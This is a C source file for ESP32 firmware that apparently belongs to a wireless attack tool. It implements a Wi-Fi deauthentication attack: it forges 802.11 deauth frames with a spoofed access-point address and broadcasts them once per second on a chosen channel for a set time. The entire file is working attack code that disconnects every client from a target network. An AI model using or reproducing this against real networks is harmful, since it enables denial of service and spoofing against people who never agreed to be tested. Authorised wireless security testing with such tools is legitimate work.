#include "deauth.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/idf_additions.h"
#include "portmacro.h"
#include "wifi_controller.h"
#include <stdint.h>
#include <string.h>

static const char *TAG = "wifi_controller/deauth";

#define SECONDS_ADJUSTMENT 10

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t sequence_ctrl[2];
  uint8_t reason[2];
} deauth_frame_t;

static deauth_frame_t deauth_frame = {
    .frame_ctrl = {0xC0, 0x00},
    .duration = {0x00, 0x00},
    .dest = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
    .src = {0},
    .bssid = {0},
    .sequence_ctrl = {0x00, 0x00},
    .reason = {0x02, 0x00},
};

void wifictl_deauth(const uint8_t target_bssid[6], const int channel,
                    const int timeout) {

  // Pushes the target MAC address into source and BSSID fields
  memcpy(deauth_frame.src, target_bssid, 6);
  memcpy(deauth_frame.bssid, target_bssid, 6);

  ESP_LOGI(TAG,
           "Broadcasting deauth frames from: %02X:%02X:%02X:%02X:%02X:%02X",
           deauth_frame.bssid[0], deauth_frame.bssid[1], deauth_frame.bssid[2],
           deauth_frame.bssid[3], deauth_frame.bssid[4], deauth_frame.bssid[5]);

  // Resets wifi to station mode only to avoid connections while broadcasting
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

  // NOTE: Channels 12,13,and 14 can't be used
  if (channel < 1 || channel > 11) {
    ESP_LOGE(TAG, "Invalid channel %d used...", channel);
    return;
  }

  // Sets the wifi channel
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to set channel %d", channel);
    return;
  }

  // Deauth Timeout Loop
  for (int time_seconds = 0; time_seconds < timeout; time_seconds++) {

    // Sends Deauth Management Frame
    ESP_LOGI(TAG, "Sending deauth frame...");
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame,
                                      sizeof(deauth_frame), false));

    // Waits 1s before next broadcast
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }

  ESP_LOGI(TAG, "Stopping broadcast of deauth frames...");

  // Sets the ESP32 back to softAP/station mode
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
}
